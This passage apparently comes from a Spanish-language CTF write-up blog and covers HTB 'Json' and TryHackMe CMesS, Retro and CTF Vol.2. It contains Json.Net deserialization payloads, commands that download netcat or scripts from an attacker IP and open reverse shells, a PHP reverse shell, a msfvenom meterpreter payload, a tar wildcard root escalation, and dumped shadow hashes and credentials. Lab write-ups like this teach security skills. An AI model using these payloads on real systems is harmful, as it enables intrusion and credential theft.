pagina y nos muestra una plataforma.\n/login.html Vemos una pagina de inicio de sesion en esta pagina.\nVerificamos las peticiones en index.html y encontramos que en el header existe una Cookie del tipo OAuth2 y tambien.\nDecodificamos el string en base64 vemos el usuario y contraseña de admin.\n1 {\u0026#34;Id\u0026#34;:1,\u0026#34;UserName\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;Password\u0026#34;:\u0026#34;21232f297a57a5a743894a0e4a801fc3\u0026#34;,\u0026#34;Name\u0026#34;:\u0026#34;User Admin HTB\u0026#34;,\u0026#34;Rol\u0026#34;:\u0026#34;Administrator\u0026#34;} Buscamos el hash del usuario admin en crackstation, el cual no sirve de nada.\n1 21232f297a57a5a743894a0e4a801fc3:admin Enviamos una solicitud erronea en base64, la cual contenia un mensaje: \u0026ldquo;Lorem ipsum\u0026rdquo;.\nVemos que dentro del mensaje de error nos muestra \u0026ldquo;Cannot deserialize Json.Net Object\u0026rdquo;.\nJson.net RCE - Deserialization Investigamos acerca del framework Json.net y vemos que existe una vulnerabilidad.\nJson Attacks\nUtilizamos ysoserial.net para poder generar nuestro payload codificado y enviarlo a la maquina, para esto utilizamos el PoC y lo modificamos.\nPoC:\n1 2 3 4 5 6 7 8 9 { \u0026#39;$type\u0026#39;:\u0026#39;System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\u0026#39;, \u0026#39;MethodName\u0026#39;:\u0026#39;Start\u0026#39;, \u0026#39;MethodParameters\u0026#39;:{ \u0026#39;$type\u0026#39;:\u0026#39;System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\u0026#39;, \u0026#39;$values\u0026#39;:[\u0026#39;cmd\u0026#39;,\u0026#39;/c calc\u0026#39;] }, \u0026#39;ObjectInstance\u0026#39;:{\u0026#39;$type\u0026#39;:\u0026#39;System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\u0026#39;} } Realizamos dos pruebas uno para hacer ping a nuestra maquina local y uno para hacer una prueba de resolucion de dominios.\n1 2 3 ./ysoserial.exe -f Json.Net -g ObjectDataProvider -o base64 -c \u0026#34;ping -n 5 10.10.14.147\u0026#34; -t \u0026gt; payload_jsonnet_ping.txt ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywnL2MgcGluZyAtbiA1IDEwLjEwLjE0LjE0NyddDQogICAgfSwNCiAgICAnT2JqZWN0SW5zdGFuY2UnOnsnJHR5cGUnOidTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OSd9DQp9 1 2 3 ./ysoserial.exe -f Json.Net -g ObjectDataProvider -o base64 -c \u0026#34;nslookup sckull 10.10.14.147\u0026#34; -t \u0026gt; payload_jsonnet_nslookup.txt ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywnL2MgbnNsb29rdXAgc2NrdWxsIDEwLjEwLjE0LjE0NyddDQogICAgfSwNCiAgICAnT2JqZWN0SW5zdGFuY2UnOnsnJHR5cGUnOidTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OSd9DQp9 Respuesta en Responder (nslookup) y tcpdump (ping).\nSHELL - userpool Tomamos el PoC que utilizamos para hacer ping a nuestra maquina y lo modificamos agregandole un comando de powershell para descargar netcat (nc.exe) y, al mismo tiempo ejecutar una shell inversa con netcat.\nComando:\n1 powershell -Command \u0026#34;Invoke-WebRequest http://10.10.14.147/nc.exe -OutFile c:/Users/Public/nc.exe\u0026#34; \u0026amp; C:/Users/Public/nc.exe -e cmd.exe 10.10.14.147 7878 Payload:\n1 2 3 4 5 6 7 8 9 { \u0026#39;$type\u0026#39;:\u0026#39;System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\u0026#39;, \u0026#39;MethodName\u0026#39;:\u0026#39;Start\u0026#39;, \u0026#39;MethodParameters\u0026#39;:{ \u0026#39;$type\u0026#39;:\u0026#39;System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\u0026#39;, \u0026#39;$values\u0026#39;:[\u0026#39;cmd\u0026#39;,\u0026#39;/c powershell -Command \u0026#34;Invoke-WebRequest http://10.10.14.147/nc.exe -OutFile c:/Users/Public/nc.exe\u0026#34; \u0026amp; C:/Users/Public/nc.exe -e cmd.exe 10.10.14.147 7878 \u0026#39;] }, \u0026#39;ObjectInstance\u0026#39;:{\u0026#39;$type\u0026#39;:\u0026#39;System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\u0026#39;} } Payload Base64:\n1 ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywnL2MgcG93ZXJzaGVsbCAtQ29tbWFuZCAiSW52b2tlLVdlYlJlcXVlc3QgaHR0cDovLzEwLjEwLjE0LjE0Ny9uYy5leGUgLU91dEZpbGUgYzovVXNlcnMvUHVibGljL25jLmV4ZSIgJiBDOi9Vc2Vycy9QdWJsaWMvbmMuZXhlIC1lIGNtZC5leGUgMTAuMTAuMTQuMTQ3IDc4NzggJ10NCiAgICB9LA0KICAgICdPYmplY3RJbnN0YW5jZSc6eyckdHlwZSc6J1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5J30NCn0NCg== Codificamos el payload en base64 y lo enviamos, y obtenemos una shell inversa con el usuario userpool.\nY obtenemos nuestra flag user.txt.\nPrivilege Escalation Realizamos una enumeracion de los privilegios del usuario userpool, vemos que tenemos habilitado SeImpersonatePrivilege, para esta maquina y estos privilegios utilizamos JuicyPotato. Utilizamos la forma \u0026ldquo;automatica\u0026rdquo; de JuicyPotato. Realizamos las siguientes modificaciones en los archivos.\n1 2 3 Invoke-LovelyPotato.ps1 $RemoteDir = \u0026#34;http://10.10.14.147\u0026#34; $LocalPath = \u0026#34;C:/Users/Public\u0026#34; Creamos nuestro payload con Msfvenom:\n1 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.147 LPORT=1339 -f exe -o meterpreter.exe Configuramos metasploit:\n1 2 3 4 use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 10.10.14.147 set LPORT 1339 Descargamos el archivo de \u0026ldquo;automatizacion\u0026rdquo; de JuicyPotato:\n1 powershell -Command \u0026#34;IEX(New-Object Net.WebClient).DownloadString(\u0026#39;http://10.10.14.147/Invoke-LovelyPotato.ps1\u0026#39;)\u0026#34; Si queremos realizarlo de forma manual podemos realizar los mismos pasos de la Maquina Conceal.\nAl terminar la ejecucion del script obtenemos nuestra shell en meterpreter.\nY nuestra flag root.txt.\n","description":"Descubrimos una vulnerabilidad de deserializacion en Json.net y usando ysoserial obtuvimos una shell inversa. Vemos que el usuario tiene permisos SeImpersonatePrivilege con ello escalamos privilegios utilizando JuicyPotato en su version para PowerShell.","id":161,"section":"posts","tags":["ftp","ysoserial","juicy potato","metasploit","deserialization",".net"],"title":"Hack The Box - Json","uri":"https://sckull.github.io/posts/json/"},{"content":"\rCMesS es una maquina de TryHackMe, realizamos una enumeracion de subdominios para encontrar credenciales para Gila CMS, subir una shell inversa y obtener acceso. Realizamos movimiento lateral utilizando una contraseña dentro de un backup. Encontramos un cronjob que realiza backups con Tar, utilizamos wildcards para ejecutar una shell inversa como root.\nRoom Titulo CMesS Descripción Can you root this Gila CMS box? Puntos 140 Dificultad Media Maker optional NMAP Escaneo de puertos tcp/udp, nmap nos muestra varios puertos abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 # Nmap 7.80 scan initiated Fri Feb 14 16:24:08 2020 as: nmap -p- -T4 -Pn -sV -sC -o nmap_scan 10.10.46.144 Nmap scan report for 10.10.46.144 Host is up (0.24s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f (RSA) | 256 21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b (ECDSA) |_ 256 5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-generator: Gila CMS | http-robots.txt: 3 disallowed entries |_/src/ /themes/ /lib/ |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=UTF-8). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Feb 14 16:45:03 2020 -- 1 IP address (1 host up) scanned in 1254.76 seconds HTTP A un principio veimas Gila CMS en el cual existe una vulnerabilidad de LFI pero el de esta maquina no es vulnerable.\nGOBUSTER Encontramos una larga lista de directorios, pero ninguno era de importancia hasta el momento.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 root@aoiri:~/tryhackme/cmess# gobuster dir -u cmess.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -q -t 35 /1 (Status: 200) /about (Status: 200) /01 (Status: 200) /login (Status: 200) /search (Status: 200) /blog (Status: 200) /index (Status: 200) /category (Status: 200) /0 (Status: 200) /feed (Status: 200) /themes (Status: 301) /admin (Status: 200) /assets (Status: 301) /tag (Status: 200) /author (Status: 200) /sites (Status: 301) /log (Status: 301) /tags (Status: 200) /1x1 (Status: 200) /lib (Status: 301) /src (Status: 301) /api (Status: 200) /robots.txt (Status: 200) /001 (Status: 200) /1pix (Status: 200) /fm (Status: 200) /tmp (Status: 301) /1a (Status: 200) /0001 (Status: 200) /1x1transparent (Status: 200) /1px (Status: 200) /1d (Status: 200) /1_1 (Status: 200) /1pixel (Status: 200) /0001-exploits (Status: 200) /01_hello (Status: 200) /1-1 (Status: 200) /1st (Status: 200) /00000001 (Status: 200) WFUZZ - SUBDOMAINS Utilizamos wfuzz para poder enumerar los subdominios de la maquina, encontramos *** de subdominio.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 root@aoiri:~/tryhackme/cmess# wfuzz -c -w subdomains-top1mil-5000.txt -u \u0026#34;http://cmess.thm\u0026#34; -H \u0026#34;Host: FUZZ.cmess.thm\u0026#34; --hl 107 Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 2.4 - The Web Fuzzer * ******************************************************** Target: http://cmess.thm/ Total requests: 5000 =================================================================== ID Response Lines Word Chars Payload =================================================================== 000000019: 200 30 L 104 W 934 Ch \u0026#34;***\u0026#34; 000002700: 400 12 L 53 W 422 Ch \u0026#34;m.\u0026#34; 000002795: 400 12 L 53 W 422 Ch \u0026#34;ns2.cl.bellsouth.net.\u0026#34; 000002883: 400 12 L 53 W 422 Ch \u0026#34;ns1.viviotech.net.\u0026#34; 000002885: 400 12 L 53 W 422 Ch \u0026#34;ns2.viviotech.net.\u0026#34; 000003050: 400 12 L 53 W 422 Ch \u0026#34;ns3.cl.bellsouth.net.\u0026#34; 000004081: 400 12 L 53 W 422 Ch \u0026#34;ferrari.fortwayne.com.\u0026#34; 000004082: 400 12 L 53 W 422 Ch \u0026#34;jordan.fortwayne.com.\u0026#34; 000004083: 400 12 L 53 W 422 Ch \u0026#34;quatro.oweb.com.\u0026#34; Total time: 131.3119 Processed Requests: 5000 Filtered Requests: 4991 Requests/sec.: 38.07726 ***.cmess.thm En el subdominio dev encontramos una contraseña del correo andre.\nSHELL - www-data Utilizamos las credenciales en el panel de administracion (/admin) con las credenciales que tenemos, una vez dentro subimos un archivo PHP de prueba para verificar que podamos ejecutar comandos, el archivo se subió en (/assets/).\n1 2 3 4 \u0026lt;?php echo \u0026#34;Testing if i can run commands:\u0026#34;; echo(exec(\u0026#34;ls \u0026#34;)); Vemos que nuestro codigo se ejecuto:\nEditamos el codigo para ejecutar una shell inversa:\n1 2 3 \u0026lt;?php exec(\u0026#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.8.1.72 7878 \u0026gt;/tmp/f\u0026#34;); echo \u0026#34;\u0026gt;:)\u0026#34;; Andre - User Enumeramos la maquina en busca de archivos interesantes, en la carpeta /opt encontramos un backup de la contraseña de Andre.\n1 2 3 4 5 6 7 8 9 10 11 12 13 www-data@cmess:/$ ls -lah opt ls -lah opt total 12K drwxr-xr-x 2 root root 4.0K Feb 6 18:54 . drwxr-xr-x 22 root root 4.0K Feb 6 17:57 .. -rwxrwxrwx 1 root root 36 Feb 6 18:54 .password.bak www-data@cmess:/$ cd opt cd opt www-data@cmess:/opt$ cat .password.bak cat .password.bak andres backup password UQ[... snip ...]P6 www-data@cmess:/opt$ Utilizamos \u0026lsquo;su\u0026rsquo;, obtenemos una shell y nuestra flag user.txt.\nPRIVILEGE ESCALATION Dentro de los archivos de la carpeta /tmp encontramos un archivo comprimido, de lo que parece /home/andre/backup/, que, la realiza el usuario root cada minuto. Para ver el cambio del archivo utilizamos date para ver la fecha de creacion y hora. Con lo anterior, renombramos la carpeta backup a backup_bak, creamos un symlink hacia la carpeta /root/, el usuario root realizara un backup de la carpeta /root/.\nO simplemente utilizar cat /etc/crontab para ver los crons\nAl pasar un minuto, vemos que la hora de creacion cambio y al extraer los archivos podemos ver nuestra flag root.txt.\nDe la misma forma podemos obtener la contraseña del usuario root (crackeada) haciendo un symlink hacia la carpeta /etc/.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 andre@cmess:~$ ln -s /etc/ backup andre@cmess:~$ ls -lah total 3.0M drwxr-x--- 4 andre andre 4.0K Feb 14 18:27 . drwxr-xr-x 3 root root 4.0K Feb 6 18:00 .. lrwxrwxrwx 1 andre andre 11 Feb 14 18:27 backup -\u0026gt; /etc/ drwxr-x--- 2 andre andre 4.0K Feb 14 17:44 backup_bak lrwxrwxrwx 1 root root 9 Feb 6 18:48 .bash_history -\u0026gt; /dev/null -rwxr-x--- 1 andre andre 220 Feb 6 18:00 .bash_logout -rwxr-x--- 1 andre andre 3.7K Feb 6 18:00 .bashrc drwxr-x--- 2 andre andre 4.0K Feb 6 18:01 .cache -rwxr-x--- 1 andre andre 655 Feb 6 18:00 .profile -rwxrwxr-x 1 andre andre 3.0M Aug 22 11:38 pspy64 lrwxrwxrwx 1 root root 9 Feb 6 18:48 .sudo_as_admin_successful -\u0026gt; /dev/null -rwxr-x--- 1 andre andre 38 Feb 6 18:46 user.txt -rwxr-x--- 1 andre andre 635 Feb 9 11:00 .viminfo andre@cmess:~$ date Fri Feb 14 18:27:05 PST 2020 andre@cmess:~$ Descomprimimos el archivo y obtenemos la contraseña encriptada:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 andre@cmess:/tmp$ ls |grep sha gshadow gshadow- shadow shadow- andre@cmess:/tmp$ cat shadow root:$6$W.gDTDR8$XXB79ORIcggP9.Cl2HzbUf[... snip ...]sdXoYOhB7Da9mFPcca5a3DyKG1:18299:0:99999:7::: daemon:*:17953:0:99999:7::: bin:*:17953:0:99999:7::: sys:*:17953:0:99999:7::: sync:*:17953:0:99999:7::: games:*:17953:0:99999:7::: man:*:17953:0:99999:7::: lp:*:17953:0:99999:7::: mail:*:17953:0:99999:7::: news:*:17953:0:99999:7::: uucp:*:17953:0:99999:7::: proxy:*:17953:0:99999:7::: www-data:*:17953:0:99999:7::: backup:*:17953:0:99999:7::: list:*:17953:0:99999:7::: irc:*:17953:0:99999:7::: gnats:*:17953:0:99999:7::: nobody:*:17953:0:99999:7::: systemd-timesync:*:17953:0:99999:7::: systemd-network:*:17953:0:99999:7::: systemd-resolve:*:17953:0:99999:7::: systemd-bus-proxy:*:17953:0:99999:7::: syslog:*:17953:0:99999:7::: _apt:*:17953:0:99999:7::: messagebus:*:18299:0:99999:7::: uuidd:*:18299:0:99999:7::: andre:$6$GeMRsVKt$KEQmO.oV7yzpLOVXjDX[... snip ...]uzhMTMl5J8rstkFQ1QD3/dLFS1yAMqj1kbiQWYvQ8.:18299:0:99999:7::: mysql:!:18299:0:99999:7::: sshd:*:18299:0:99999:7::: andre@cmess:/tmp$ SHELL - ROOT Para obtener una shell con el usuario root utilizamos las \u0026lsquo;wildcards\u0026rsquo; para ejecutar una shell inversa. Creamos un archivo con nuestra shell inversa y las \u0026lsquo;wildcards\u0026rsquo; que se ejecutarán junto con el comando tar:\n1 2 3 echo \u0026#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.8.1.72 8989 \u0026gt;/tmp/f\u0026#34; \u0026gt; shell.sh echo \u0026#34;\u0026#34;\u0026gt; \u0026#34;--checkpoint-action=exec=sh shell.sh\u0026#34; echo \u0026#34;\u0026#34;\u0026gt; --checkpoint=1 Verificamos:\n1 2 3 andre@cmess:~/backup$ ls --checkpoint=1 --checkpoint-action=exec=sh shell.sh shell.sh andre@cmess:~/backup$ Esperamos y obtenemos una shell root:\nINFO - Wildcard Privilege Escalation\nANEXO - WWW-DATA MYSQL Dentro de la configuracion de la pagina vemos las credenciales para conectarse a la base de datos, encontramos algunas tablas interesantes pero ningun dato nos ayudo para ninguno de los usuarios.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 www-data@cmess:/var/www/html$ cat config.php cat config.php \u0026lt;?php $GLOBALS[\u0026#39;config\u0026#39;] = array ( \u0026#39;db\u0026#39; =\u0026gt; array ( \u0026#39;host\u0026#39; =\u0026gt; \u0026#39;localhost\u0026#39;, \u0026#39;user\u0026#39; =\u0026gt; \u0026#39;root\u0026#39;, \u0026#39;pass\u0026#39; =\u0026gt; \u0026#39;r0otus3rpassw0rd\u0026#39;, \u0026#39;name\u0026#39; =\u0026gt; \u0026#39;gila\u0026#39;, ), \u0026#39;permissions\u0026#39; =\u0026gt; array ( 1 =\u0026gt; array ( 0 =\u0026gt; \u0026#39;admin\u0026#39;, 1 =\u0026gt; \u0026#39;admin_user\u0026#39;, 2 =\u0026gt; \u0026#39;admin_userrole\u0026#39;, ), ), \u0026#39;packages\u0026#39; =\u0026gt; array ( 0 =\u0026gt; \u0026#39;blog\u0026#39;, ), \u0026#39;base\u0026#39; =\u0026gt; \u0026#39;http://cmess.thm/gila/\u0026#39;, \u0026#39;theme\u0026#39; =\u0026gt; \u0026#39;gila-blog\u0026#39;, \u0026#39;title\u0026#39; =\u0026gt; \u0026#39;Gila CMS\u0026#39;, \u0026#39;slogan\u0026#39; =\u0026gt; \u0026#39;An awesome website!\u0026#39;, \u0026#39;default-controller\u0026#39; =\u0026gt; \u0026#39;blog\u0026#39;, \u0026#39;timezone\u0026#39; =\u0026gt; \u0026#39;America/Mexico_City\u0026#39;, \u0026#39;ssl\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;env\u0026#39; =\u0026gt; \u0026#39;pro\u0026#39;, \u0026#39;check4updates\u0026#39; =\u0026gt; 1, \u0026#39;language\u0026#39; =\u0026gt; \u0026#39;en\u0026#39;, \u0026#39;admin_email\u0026#39; =\u0026gt; \u0026#39;andre@cmess.thm\u0026#39;, \u0026#39;rewrite\u0026#39; =\u0026gt; true, );www-data@cmess:/var/www/html$ Utilizamos las credenciales con mysql, y en la tabla users de la base de datos gila encontramos la contraseña encriptada del usuario andre, ademas de eso encontramos las cookies del usuario andre:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 mysql\u0026gt; show databases; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | gila | | mysql | | performance_schema | | sys | +--------------------+ 5 rows in set (0.00 sec) mysql\u0026gt; use gila; use gila; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed mysql\u0026gt; show tables; +----------------+ | Tables_in_gila | +----------------+ | option | | page | | post | | postcategory | | postmeta | | user | | usermeta | | userrole | | widget | +----------------+ 9 rows in set (0.00 sec) mysql\u0026gt; select * from user; select * from user; +----+----------+-----------------+--------------------------------------------------------------+--------+------------+---------------------+---------------------+ | id | username | email | pass | active | reset_code | created | updated | +----+----------+-----------------+--------------------------------------------------------------+--------+------------+---------------------+---------------------+ | 1 | andre | andre@cmess.thm | $2y$10$uNAA0MEze02jd.qU9tnYLu43bNo9nujltElcWEAcifNeZdk4bEsBa | 1 | | 2020-02-06 18:20:34 | 2020-02-06 18:20:34 | +----+----------+-----------------+--------------------------------------------------------------+--------+------------+---------------------+---------------------+ 1 row in set (0.00 sec) mysql\u0026gt; select * from usermeta; select * from usermeta; +----+---------+------------+----------------------------------------------------+ | id | user_id | vartype | value | +----+---------+------------+----------------------------------------------------+ | 1 | 1 | privilege | admin | | 2 | 1 | GSESSIONID | 1ik2ha97chatolvcena3moomw802zssf3e9tdo9v9fwl86w0uv | | 3 | 1 | GSESSIONID | 1mwxigp2xzt4oc6ka9neshxlzrnwefvsmenppbod9826mmhikz | +----+---------+------------+----------------------------------------------------+ 3 rows in set (0.00 sec) ","description":"CMesS es una maquina de TryHackMe, realizamos una enumeracion de subdominios para encontrar credenciales para Gila CMS, subir una shell inversa y obtener acceso. Realizamos movimiento lateral utilizando una contraseña dentro de un backup. Encontramos un cronjob que realiza backups con Tar, utilizamos wildcards para ejecutar una shell inversa como root.","id":162,"section":"posts","tags":["cron","wildcard privesc"],"title":"TryHackMe - CMesS","uri":"https://sckull.github.io/posts/cmess/"},{"content":"\rRetro es una maquina de TryHackMe con Sistem Windows expone RDP por donde ingresamos con credenciales en comentarios de WordPress. Obtuvimos acceso privilegiado con informacion que encontramos en el historial de Chrome.\nRoom Titulo Retro Descripción New high score! Puntos 690 Dificultad Dificil Maker DarkStar7471 NMAP Escaneo de puertos tcp, nmap nos muestra varios puertos abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 # Nmap 7.80 scan initiated Thu Feb 13 16:45:26 2020 as: nmap -p- -T4 -Pn -sV -sC -o nmap_scan 10.10.69.12 Nmap scan report for 10.10.69.12 Host is up (0.23s latency). Not shown: 65533 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: IIS Windows Server 3389/tcp open ms-wbt-server Microsoft Terminal Services | ssl-cert: Subject: commonName=RetroWeb | Not valid before: 2019-12-07T23:49:24 |_Not valid after: 2020-06-07T23:49:24 |_ssl-date: 2020-02-13T22:50:58+00:00; -1s from scanner time. Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: -1s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Feb 13 16:50:59 2020 -- 1 IP address (1 host up) scanned in 333.22 seconds HTTP GOBUSTER Utilizamos gobuster para busqueda de directorios y archivos que nos pudiesen servir.\n1 2 root@aoiri:~/tryhackme/retro# gobuster dir -u 10.10.69.12 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -q -t 105 -x php,asp,aspx,txt,html /retro (Status: 301) /retro Dentro de la pagina encontramos un post el cual contiene un comentario del usuario wade.\nRDP - User Consideramos que \u0026lsquo;parzival\u0026rsquo; es una contraseña del usuario wade, utilizamos el servicio RDP de la maquina para utilizar esta informacion. Utilizamos vinagre para conectarnos a la maquina. Obtenemos nuestra flag user.txt.\nPRIVILEGE ESCALATION Enumeramos la maquina y vemos en el historial un CVE que el usuario estuvo buscando ademas de eso un archivo en la papelera de reciclaje. Investigamos que podria ser este archivo y encontramos que es utilizado para obtener privilegios de administracion en el CVE-2019-1388.\nCVE-2019-1388 Seguimos los pasos que nos indican en github, en caso de que no podamos realizar los pasos podemos utilizar el siguiente exploit:\nCVE-2017-0213 Build 14393:\nObtenemos nuestra shell como usuario administrator y nuestra flag root.txt.\n","description":"Retro es una maquina de TryHackMe con Sistem Windows expone RDP por donde ingresamos con credenciales en comentarios de WordPress. Obtuvimos acceso privilegiado con informacion que encontramos en el historial de Chrome.","id":163,"section":"posts","tags":["rdp"],"title":"TryHackMe - Retro","uri":"https://sckull.github.io/posts/retro/"},{"content":"\rCTF collection Vol.2 en su version edicion es una serie de retos Web presentada por Deskel de TryHackMe.\nRoom Titulo CTF collection Vol.2 Descripción Sharpening up your CTF skill with the collection. The second volume is about web-based CTF. Puntos 950 Dificultad Media Maker DesKel GOBUSTER 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 root@aoiri:~/tryhackme/ctfvolcollection2# gobuster dir -u http://10.10.51.83/ -w /usr/share/wordlists/dirb/common_nofirst10.txt -q -t 35 -x php,html,txt /button (Status: 200) /cat (Status: 200) /cgi-bin/ (Status: 403) /cgi-bin/.html (Status: 403) /index.php (Status: 200) /index (Status: 200) /index.php (Status: 200) /iphone (Status: 200) /login (Status: 301) /robots (Status: 200) /robots.txt (Status: 200) /robots.txt (Status: 200) /server-status (Status: 403) /small (Status: 200) /static (Status: 200) root@aoiri:~/tryhackme/ctfvolcollection2# Easter 1 La maquina esta diseñada para ser explotada via web para obtener las flags. Desde este punto de vista utilizamos gobuster para obtener los directorios, como siempre, revisamos el archivo robots.txt donde vemos una cadena en hexadecimal.\nUtilizamos CyberChef para obtener nuestra flag:\nEaster 2 Revisamos el archivo robots.txt nuevamente, donde vemos una URL codificada.\nUtilizamos CyberChef para poder decodificar la cadena y obtener nuestra flag.\n1 Base64 \u0026gt; URL decode \u0026gt; Base64 \u0026gt; \u0026#34;Remove spaces\u0026#34; \u0026gt; Base64 \u0026gt; \u0026#34;Remove spaces\u0026#34; \u0026gt; Base64 Visitamos la url que logramos decodificar, obtenemos nuestra flag.\nEaster 3 En el codigo fuente de /login encontramos nuestra flag.\nEaster 4 En la pagina /login encontramos un formulario, capturamos los datos del metodo POST y utilizamos SQLMAP para realizar una inyeccion SQL POST. Obtenemos la contraseña de DesKel y la crackeamos con md5hashing\n1 2 3 4 5 6 7 8 Database: THM_f0und_m3 Table: nothing_inside [1 entry] +-------------------------+ | Easter_4 | +-------------------------+ | THM{ ... snip ... } | +-------------------------+ Easter 5 De la misma forma 